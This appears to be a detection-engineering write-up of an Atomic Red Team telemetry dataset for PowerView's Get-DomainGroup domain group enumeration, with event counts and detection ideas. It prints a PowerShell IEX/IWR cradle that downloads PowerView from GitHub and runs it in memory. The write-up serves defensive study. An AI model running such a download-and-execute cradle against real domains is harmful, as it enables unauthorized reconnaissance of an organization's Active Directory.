# T1069.002-13: Domain Groups — Get-DomainGroup with PowerView

## Technique Context

T1069.002 (Domain Groups) with PowerView's `Get-DomainGroup` performs broad enumeration of all Active Directory groups, rather than targeting a specific group's membership. This is the survey step: an attacker who has just compromised a domain-joined workstation runs `Get-DomainGroup -verbose` to discover what groups exist, understand the domain's organizational structure, and identify interesting targets for deeper investigation with tools like `Get-DomainGroupMember`. Custom security groups, privileged service account groups, and non-standard admin groups are all revealed through this enumeration.

PowerView's group discovery functions perform LDAP queries against the domain controller to retrieve group objects with their properties. The `-verbose` flag increases output detail. Like `Get-DomainGroupMember`, the tool is fetched live via `IEX (IWR ...)` rather than staged to disk, using the same PowerSploit GitHub repository URL pattern.

In the defended version, Defender blocked this execution with `STATUS_ACCESS_DENIED` before PowerView could load. With Defender disabled, the download and full execution proceed.

## What This Dataset Contains

Security EID 4688 captures the full command:

```
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose}
```

The same TLS enforcement + IEX + IWR download cradle as T1069.002-12, with `Get-DomainGroup -verbose` replacing `Get-DomainGroupMember`. A cleanup PowerShell process with empty command block (`"powershell.exe" & {}`) appears as a second EID 4688 event, confirming full execution completion.

The Application channel contains one EID 15 event: "Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON." This is a Defender state change event from the test environment management — it indicates Defender was briefly re-enabled (or its status was reported) during this test window. This is an artifact of the test framework managing Defender state across sequential test runs and confirms the ART test framework methodology.

Sysmon provides 22 events: 14 EID 7 (image load), 3 EID 1 (process create), 3 EID 10 (process access), 1 EID 17 (pipe create), and 1 EID 8 (CreateRemoteThread). The EID 8 CreateRemoteThread event mirrors T1069.002-12: `powershell.exe` creating a thread in `<unknown process>` (PID 5852, NewThreadId 900) at `StartAddress: 0x00007FF77E8753A0`. The identical start address across both PowerView tests suggests this is a consistent PowerView execution artifact — the same code location being invoked each time.

The PowerShell channel has 96 events (93 EID 4104, 2 EID 4100, 1 EID 4103), essentially the same volume as T1069.002-12. This is consistent with both tests loading the same PowerView.ps1 script body, which generates similar numbers of script block events regardless of which function is ultimately called.

Compared to the defended version (17 sysmon, 9 security, 42 PowerShell events), this undefended run shows notably more sysmon activity (22 vs 17), consistent security events (4 vs 9 — the defended run has 9 including process termination with ACCESS_DENIED), and significantly more PowerShell events (96 vs 42), confirming successful PowerView loading.

## What This Dataset Does Not Contain

As with T1069.002-12, the network telemetry for the GitHub download and LDAP queries to the domain controller is absent from samples. The PowerView function definitions and `Get-DomainGroup` execution details in the script block logs are present in the full 93-event EID 4104 dataset but not in the 20-event sample. The actual domain group enumeration results — the list of AD groups and their properties — are not captured.

The EID 8 CreateRemoteThread target process (`<unknown process>`) could not be resolved at log time, which limits forensic investigation of what code was injected into which process. This is a Sysmon resolution limitation rather than a logging gap.

## Assessment

This dataset, alongside T1069.002-12, forms a complementary pair for PowerView-based domain group enumeration. The two tests share the same download mechanism, similar telemetry profiles, and the same EID 8 CreateRemoteThread signature. Together they demonstrate that the PowerView execution fingerprint — EID 8 CreateRemoteThread at `0x00007FF77E8753A0`, increased EID 4104 volume, and the specific GitHub URL pattern — is consistent across different PowerView functions.

The Application EID 15 Defender state event provides an incidental test methodology artifact that may appear in other datasets from this batch run.

## Detection Opportunities Present in This Data

1. **EID 4688 / Sysmon EID 1 — PowerView download + `Get-DomainGroup -verbose`**: The command line contains the full PowerSploit URL and `Get-DomainGroup`. The `-verbose` flag is a behavioral indicator of comprehensive enumeration intent.

2. **Sysmon EID 8 — CreateRemoteThread from PowerShell at start address `0x00007FF77E8753A0`**: This start address appears identically in T1069.002-12 and T1069.002-13. If this address is consistent across PowerView runs on the same build of PowerView.ps1, it represents a behavioral hash suitable for detection rule development. Flagging CreateRemoteThread events from PowerShell to unknown processes at this address would be highly specific.

3. **EID 4104 volume spike from a single PowerShell process**: 93 script block events from a single PowerShell process represents a >4x increase over the test framework-only baseline (~15-20 events). An anomaly-based detection on per-process EID 4104 count could identify PowerView loading without requiring specific content matching.

4. **Application EID 15 — Defender status transitions flanking attack execution**: In sequential ART test runs, Defender status change events in the Application log (EID 15, "SECURITY_PRODUCT_STATE_ON") may appear near attack technique executions. While not a direct attack indicator, this event combined with nearby PowerShell activity can help establish test context and timing correlation.

5. **IEX + raw.githubusercontent.com + PowerSploit path**: Any occurrence of the path component `PowerShellMafia/PowerSploit` in a PowerShell command line or script block is a high-confidence indicator of PowerView usage, regardless of which specific function follows.
